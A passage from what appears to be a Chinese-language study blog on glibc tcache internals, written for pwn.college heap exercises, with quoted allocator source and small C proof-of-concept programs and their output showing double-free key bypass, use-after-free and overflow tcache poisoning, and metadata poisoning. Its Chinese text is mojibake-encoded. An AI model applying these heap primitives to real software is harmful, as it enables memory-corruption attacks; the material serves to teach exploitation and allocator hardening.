class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">            tcache_entry *e = (tcache_entry *)chunk2mem(p);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">               trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">               2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">               coincidence before aborting.  */</span></span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely(e-&gt;key == tcache))</span><br><span class="line">            &#123;	<span class="comment">//å¦‚æœæ£€æŸ¥åˆ°e-&gt;key == tcache, è¯´æ˜å¯èƒ½å­˜åœ¨double free ,å› ä¸ºè‡ªç„¶æƒ…å†µä¸‹å †å—ä¸­çš„æ•°æ®ç­‰äºtcacheåœ°å€æ¦‚ç‡å¤ªå°äº†</span></span><br><span class="line">                <span class="comment">//ä¸ºäº†é¿å…è¯¯æ€, ä¸‹é¢è¿˜æ˜¯è¦å†æ¬¡ç¡®å®šä¸€ä¸‹, tcacheç›¸å…³æ¡¶å­é‡Œæ˜¯å¦çœŸçš„æœ‰è¿™ä¸ªå †å—</span></span><br><span class="line">                <span class="comment">//å¦‚æœçœŸæœ‰åˆ™è¯´æ˜çœŸçš„double freeäº†</span></span><br><span class="line">                <span class="comment">//ä¹Ÿå°±æ˜¯è¯´e-&gt;key == tcache æ˜¯è¿™ä¸ªè¯Šæ–­æµç¨‹çš„å¯¼ç«ç´¢</span></span><br><span class="line">                tcache_entry *tmp;</span><br><span class="line">                LIBC_PROBE(memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">                <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];<span class="comment">//ä»å¤´å¾€åéå†åˆ¤æ–­å·²æœ‰çš„å †å—æ˜¯ä¸æ˜¯å½“å‰è¦æ’å…¥çš„å †å—</span></span><br><span class="line">                     tmp;</span><br><span class="line">                     tmp = tmp-&gt;next)</span><br><span class="line">                    <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                        malloc_printerr(<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">                <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">                   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)	<span class="comment">//æ ¹æ®countsåˆ¤æ–­æ˜¯å¦å·²ç»è£…æ»¡</span></span><br><span class="line">            &#123;</span><br><span class="line">                tcache_put(p, tc_idx);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>ç›¸æ¯”äº<code>glibc-2.27</code>, åŠ å…¥äº†æ”¾å›å †å—å‰çš„<code>double free</code>æ£€æŸ¥, ä½†æ˜¯è¯¥æ£€æŸ¥å¾ˆå®¹æ˜“ç»•è¿‡</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="comment">//å‡è®¾æº¢å‡ºä¿®æ”¹chunkmem, ä»¥ç»•è¿‡å¯¹keyçš„æ£€æŸ¥</span></span><br><span class="line">    chunk[<span class="number">0</span>] = <span class="number">0</span>;	<span class="comment">//next</span></span><br><span class="line">    chunk[<span class="number">1</span>] = <span class="number">0</span>;	<span class="comment">//key</span></span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="type">char</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2 @ %p\n&quot;</span>,chunk2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test<span class="meta"># gcc 231_df.c -o 231_df -w</span></span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./<span class="number">231</span>_df</span><br><span class="line">chunk1 @ <span class="number">0x5572b2c55260</span></span><br><span class="line">chunk2 @ <span class="number">0x5572b2c55260</span></span><br></pre></td></tr></table></figure>

<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>glibc2.31ä¸­çš„åˆ©ç”¨æ‰‹æ®µ,åŸºæœ¬ä¸Šéƒ½æ˜¯é’ˆå¯¹nextæŒ‡é’ˆæ²¡æœ‰çº¦æŸ, æ”»å‡»è€…å¯ä»¥éšä¾¿ä¿®æ”¹ä¹‹</p>
<h4 id="Use-After-Free-å¯¼è‡´-tcache-entry-poisoning"><a href="#Use-After-Free-å¯¼è‡´-tcache-entry-poisoning" class="headerlink" title="Use After Free å¯¼è‡´ tcache entry poisoning"></a>Use After Free å¯¼è‡´ tcache entry poisoning</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>]=<span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> * chunk_victim;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = buffer;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk_victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_victim now points to %p\n &quot;</span>,chunk_victim);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc uaf.c -o uaf -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./uaf</span><br><span class="line">chunk_victim now points to 0x7fff53e7c010</span><br></pre></td></tr></table></figure>



<h4 id="Double-Freeé€ æˆé‡å¤å¼•ç”¨"><a href="#Double-Freeé€ æˆé‡å¤å¼•ç”¨" class="headerlink" title="Double Freeé€ æˆé‡å¤å¼•ç”¨"></a>Double Freeé€ æˆé‡å¤å¼•ç”¨</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_dup;</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">1</span>] = <span class="number">0</span>;      <span class="comment">//æŠŠkeyæ‰¬äº†</span></span><br><span class="line">    <span class="built_in">free</span>(chunk1);       <span class="comment">//double free</span></span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);			</span><br><span class="line">    chunk1_dup = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		<span class="comment">//duplicated reference</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1 @ %p\n&quot;</span>,chunk1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk1_dup @ %p\n&quot;</span>,chunk1_dup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc df.c -o <span class="built_in">df</span> -w </span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./df</span><br><span class="line">chunk1 @ 0x555596ef62a0</span><br><span class="line">chunk1_dup @ 0x555596ef62a0</span><br></pre></td></tr></table></figure>



<h4 id="tcache-overflow-å¯¼è‡´-tcache-entry-poisoning"><a href="#tcache-overflow-å¯¼è‡´-tcache-entry-poisoning" class="headerlink" title="tcache overflow å¯¼è‡´ tcache entry poisoning"></a>tcache overflow å¯¼è‡´ tcache entry poisoning</h4><p>å¯ä»¥åˆ©ç”¨å †æº¢å‡ºé€ æˆä»»æ„åœ°å€è¯»å†™</p>
<p>1.å…ˆåè¿ç»­åˆ†é…ä¸¤ä¸ªå †å—<code>chunk1</code>,<code>chunk2</code>,ä½¿å…¶åœ°å€ç‰©ç†ä¸Šç›¸é‚»,è¿™æ ·<code>chunk2</code>ä½äºå†…å­˜é«˜å¤„, <code>chunk1</code>å¯ä»¥ä»ä½å¤„å¾€é«˜å¤„æº¢å‡º</p>
<p>2.é‡Šæ”¾<code>chunk2</code>ä½¿å…¶è¿”å›åˆ°<code>tcache</code>ä¸­</p>
<p>3.ä»<code>chunk1</code>å¼€å§‹æº¢å‡º,æ„é€ <code>chunk2</code>çš„å‡å¤´,å¹¶ä¿®æ”¹<code>chunk2</code>çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªå¸Œæœ›çš„åœ°å€<code>target_addr</code></p>
<p>4.å†åˆ†é…ä¸€æ¬¡,æ‹¿å‡º<code>chunk2</code></p>
<p>5.å†åˆ†é…ä¸€æ¬¡,æ‹¿å‡º<code>target_addr</code></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯,<code>glibc2.31</code>ä¸­,åˆ¤æ–­<code>tcache</code>ä¸­æ˜¯å¦è¿˜æœ‰å †å—çš„ä¾æ®æ˜¯<code>counts[idx]</code>è®¡æ•°,è€Œä¸æ˜¯çœ‹æŒ‡é’ˆæ˜¯å¦ä¸ºç©º</p>
<p>å› æ­¤å¯ä»¥æ‰¾ç‚®ç°å †å—å¡«çº¿,æ»¥ç«½å……æ•°ä¸€ä¸‹æŠŠ<code>counts</code>å«é«˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015134751799.png" alt="image-20241015134751799"></p>
<p>å‡è®¾<code>chunk1</code>å’Œ<code>chunk2</code>éƒ½æ˜¯<code>malloc(0x20)</code>è·å–çš„å †å—,é‚£ä¹ˆç«™åœ¨<code>chunk1_mem</code>è§†è§’ä¸Š</p>
<table>
<thead>
<tr>
<th>item</th>
<th>offset based on chunk1_mem</th>
<th>value</th>
</tr>
</thead>
<tbody><tr>
<td>chunk1_mem</td>
<td>0</td>
<td>pad</td>
</tr>
<tr>
<td></td>
<td>â€¦</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_prev_size</td>
<td>+ 0x20</td>
<td>pad</td>
</tr>
<tr>
<td>chunk2_size</td>
<td>+ 0x28</td>
<td>0x31</td>
</tr>
<tr>
<td>chunk2_next</td>
<td>+ 0x30</td>
<td>target_addr</td>
</tr>
<tr>
<td>chunk2_key</td>
<td>+ 0x38</td>
<td>ä¸å˜</td>
</tr>
</tbody></table>
<p>å†™ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[] = <span class="string">&quot;flag&#123;aaaa&#125;&quot;</span>;</span><br><span class="line">    <span class="type">size_t</span> * chunk1_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem;</span><br><span class="line">    <span class="type">size_t</span> * chunkbait;</span><br><span class="line">    <span class="type">size_t</span> * chunk2_mem_next;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line"></span><br><span class="line">    chunk1_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    chunkbait = <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">//ç‚®ç°</span></span><br><span class="line">    <span class="built_in">free</span>(chunkbait);</span><br><span class="line">    <span class="built_in">free</span>(chunk2_mem);</span><br><span class="line"></span><br><span class="line">    chunk2_mem_next = (<span class="type">char</span>*)chunk1_mem + <span class="number">0x30</span>;<span class="comment">//å‡è®¾chunk1ä¸Šoverflowèƒ½è¦†ç›–chunk2 metadata</span></span><br><span class="line">    chunk2_mem_next[<span class="number">0</span>] = buffer;	<span class="comment">//bufferæ²¾äº²å¸¦æ•…åŠ å…¥äº†tcache</span></span><br><span class="line"></span><br><span class="line">    chunk2_mem = <span class="built_in">malloc</span>(<span class="number">0x20</span>);		</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(victim,<span class="string">&quot;flag&#123;bbbb&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;buffer now is %s\n&quot;</span>,buffer);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œç»“æœ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# gcc test.c -o <span class="built_in">test</span> -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/level15.0# ./test</span><br><span class="line">buffer now is flag&#123;aaaa&#125;</span><br><span class="line">buffer now is flag&#123;bbbb&#125;</span><br><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>



<h4 id="tcache-entry-poisoningå¯¼è‡´tcache-metadata-poisoning"><a href="#tcache-entry-poisoningå¯¼è‡´tcache-metadata-poisoning" class="headerlink" title="tcache entry poisoningå¯¼è‡´tcache metadata poisoning"></a>tcache entry poisoningå¯¼è‡´tcache metadata poisoning</h4><p>ä¹‹å‰æˆ‘ä»¬<code>tcache poisoning</code>éƒ½æ˜¯è¿™æ ·è€ƒè™‘çš„:</p>
<p>1.mallocä¸€ä¸ªå †å—</p>
<p>2.freeè¯¥å †å—è¿›å…¥tcache</p>
<p>3.UAFä¿®æ”¹è¯¥å †å—çš„nextæŒ‡é’ˆ,æŒ‡å‘ç›®æ ‡åœ°å€</p>
<p>4.mallocæ‹¿å‡ºè¯¥å †å—</p>
<p>5.mallocæ‹¿å‡ºç›®æ ‡åœ°å€å‡å †å—</p>
<p>æˆ‘ä»¬çš„ç›®å…‰å±€é™åœ¨äº†å †å—ä¸Š,ç„¶è€Œå®é™…ä¸Šå¯¹å †å—çš„æŠ•æ¯’,ä¹Ÿä¼šä¼ æŸ“ç»™å…ƒæ•°æ®,å¹¶ä¸”è¿˜ä¼šä¼ æŸ“ç»™åç»­çš„å †å—,è€ƒè™‘å¦‚ä¸‹åœºæ™¯:</p>
<p>1.åˆ©ç”¨UAFå°†<code>fake_chunk</code>ä¹ŸåŠ å…¥åˆ°<code>tcache</code>ä¸­</p>
<p>è¿™ä¸ª<code>fake_chunk</code>çš„<code>next=0xcafebabe</code> æ˜¯ä¸€ä¸ªä»»æ„å€¼, æ˜¾ç„¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203432281.png" alt="image-20241015203432281"></p>
<p>2.ä¸€ä¸ª<code>malloc</code>æŠŠ<code>chunk1</code>æ‹¿å‡ºæ¥,æ­¤æ—¶æ¡¶å­å¤´æŒ‡å‘äº†<code>fake_chunk</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015203623434.png" alt="image-20241015203623434"></p>
<p>3.å†ä¸€ä¸ª<code>malloc</code>æŠŠ<code>fake_chunk</code>æ‹¿å‡ºæ¥,é‚£ä¹ˆæ¡¶å­å¤´ä¼šç»§æ‰¿<code>fake_chunk.next</code></p>
<p>å¹¶ä¸”<code>tcache</code>ä¸­çš„å †å—è¢«é‡æ–°åˆ†é…æ—¶,å…¶<code>key</code>ä¼šè¢«ç½®é›¶,å› æ­¤<code>fake_chunk_addr</code><strong>åç§»8å­—èŠ‚å¤„çš„8ä¸ªå­—èŠ‚</strong>ä¼šè¢«ç½®é›¶</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204025478.png" alt="image-20241015204025478"></p>
<p>4.æ­¤æ—¶<code>free</code>ä¸€ä¸ªåŒæ ·å¤§å°çš„å †å—è¿›å…¥<code>tcache</code>,ç”±äºå…ƒæ•°æ®å·²ç»è¢«æŠ•æ¯’,æ–°å †å—ä¼šç»§æ‰¿æ¡¶å­å¤´çš„<code>next</code>æŒ‡é’ˆ,ä¹Ÿå°±æ˜¯<code>0xcafebabe</code></p>
<p>æ­¤æ—¶å¦‚æœæœ‰<code>chunk2</code>çš„<code>UAF</code>å°±å¯ä»¥æ³„éœ²<code>0xcafebabe</code>è¿™ä¸ªå€¼</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241015204205909.png" alt="image-20241015204205909"></p>
<p>å†™ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk_bait;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk_header[<span class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *fake_chunk = (<span class="type">char</span>*)fake_chunk_header + <span class="number">0x10</span>; </span><br><span class="line">    fake_chunk[<span class="number">0</span>] = <span class="number">0xcafebabe</span>;</span><br><span class="line">    fake_chunk[<span class="number">1</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;previous fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_bait = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk_bait);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    chunk1[<span class="number">0</span>] = fake_chunk;</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    fake_chunk = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;now fake_chunk.key = %p\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk2.next = %p\n&quot;</span>, chunk2[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# gcc metadata.c -o metadata -g -w</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/heap/test# ./metadata</span><br><span class="line">previous fake_chunk.key = 0xdeadbeef</span><br><span class="line">now fake_chunk.key = (nil)</span><br><span class="line">chunk2.next = 0xcafebabe</span><br></pre></td></tr></table></figure>







<h3 id="glibc-2-38"><a href="#glibc-2-38" class="headerlink" title="glibc-2.38"></a>glibc-2.38</h3><p>æ•°æ®ç»“æ„ä¸<code>glibc-2.31</code>ç›¸æ¯”,åœ¨æ•°æ®ç»“æ„ä¸Šå¹¶æ— å¤ªå¤§å˜åŒ–, ä½†æ˜¯ç€é‡åŠ å›ºäº†<code>key</code>å’Œ<code>next</code>å­—æ®µçš„è®¡ç®—ç®—æ³•, ç›®çš„æ˜¯ä¸ºäº†å°½é‡ç¼“è§£<code>double free</code></p>
<h4 id="datastructure-2"><a href="#datastructure-2" class="headerlink" title="datastructure"></a>datastructure</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>

<p><code>key</code>ä¸å†æ˜¯<code>tcache</code>åŸºåœ°å€,è€Œæ˜¯ä¸€ä¸ªéšæœºæ•°</p>
<p><code>next</code>ä¸å†æ˜¯æ˜æ–‡çš„ä¸‹ä¸€ä¸ªå †å—åœ°å€,åŠ äº†å¯†äº†,ç›–äº†å¸½äº†</p>
<h4 id="algorithm-2"><a href="#algorithm-2" class="headerlink" title="algorithm"></a>algorithm</h4><h5 id="key-init"><a href="#key-init" class="headerlink" title="key init"></a>key init</h5><p>åœ¨<code>malloc.c</code>ä¸­æœ‰ä¸€ä¸ªé™æ€å˜é‡<code>tcache_key</code>, æ¯ä¸€ä¸ªè¢«æ”¾åˆ°<code>tcahce</code>ä¸­çš„å †å—, éƒ½ä¼šæ‹·è´ä¹‹ä½œä¸ºè‡ªå·±çš„<code>key</code></p>
<p>ä¸<code>glibc-2.31</code>ä¸Šç›´æ¥ä½¿ç”¨<code>tcache</code>åœ°å€ä½œä¸º<code>key</code>ä¸åŒ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uintptr_t</span> tcache_key;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå€¼ä¼šåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨<code>malloc</code>æ—¶, åœ¨æ•´ä¸ªå †åˆå§‹åŒ–ä¹‹å‰, ç‡å…ˆåˆå§‹åŒ–, åŒ…æ‹¬<code>fopen</code>ç­‰æ“ä½œé—´æ¥è°ƒç”¨çš„<code>malloc</code></p>
<p>æ•´ä¸ªåˆå§‹åŒ–è¿‡ç¨‹æ˜¯è¿™æ ·çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span> @ <span class="built_in">malloc</span>/<span class="built_in">malloc</span>.c</span><br><span class="line">	ptmalloc_init @ <span class="built_in">malloc</span>/arena.c</span><br><span class="line">		tcache_key_initialize</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_key_initialize</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (__getrandom_nocancel(&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK) != <span class="keyword">sizeof</span>(tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">        tcache_key = random_bits();</span><br><span class="line"><span 